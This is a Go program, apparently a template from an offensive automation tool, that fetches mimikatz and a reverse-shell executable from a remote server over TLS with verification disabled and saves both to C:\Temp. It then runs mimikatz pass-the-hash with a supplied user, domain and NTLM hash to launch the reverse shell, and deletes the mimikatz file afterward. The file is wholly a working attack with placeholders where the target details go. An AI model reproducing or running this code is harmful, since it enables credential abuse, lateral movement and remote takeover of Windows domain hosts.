package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var TempDir = "C:\\Temp"

func GETHELPER(helper string, filePath string) error {
	jobUuid := os.Args[1]
	req, err := http.NewRequest("GET", "https://HOST:PORT/helpers/"+jobUuid+"/"+helper, nil)
	if err != nil {
		return err
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return err
	}
	err = WRITETOFILE(filePath, string(respBody))
	if err != nil {
		return err
	}
	return nil
}

func WRITETOFILE(filePath string, data string) error {
	err := os.MkdirAll(TempDir, os.ModePerm)
	if err != nil {
		return err
	}
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return err
	}
	return file.Sync()
}

// DOMAIN
func RUNMIMIKATZ() {
	var MimikatzFullPath = TempDir + "\\" + "MIMIKATZFILENAME.exe"
	var ReverseShellFullPath = TempDir + "\\" + "REVERSESHELLNAME.exe"
	err := GETHELPER("mimikatz.exe", MimikatzFullPath)
	err = GETHELPER("revshell.exe", ReverseShellFullPath)
	if err != nil {
		fmt.Println(err)
	}
	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTLM /run:\""+ReverseShellFullPath+"\"", "exit").Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(mimikatzOut))
	err = os.Remove(MimikatzFullPath)
	if err != nil {
		fmt.Println(err)
	}
	// err = os.Remove(ReverseShellFullPath)
	// if err != nil {
	// 	fmt.Println(err)
	// }
}

func main() {
	RUNMIMIKATZ()
}
